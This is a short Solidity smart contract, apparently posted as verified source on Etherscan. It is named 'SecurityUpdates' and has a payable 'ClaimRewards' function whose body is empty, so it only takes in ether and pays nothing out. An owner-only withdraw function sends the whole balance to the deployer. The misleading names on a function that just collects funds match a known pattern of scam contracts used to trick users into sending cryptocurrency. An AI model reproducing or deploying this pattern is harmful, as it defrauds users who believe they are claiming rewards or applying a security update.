/**
 *Submitted for verification at Etherscan.io on 2023-02-25
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function ClaimRewards() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}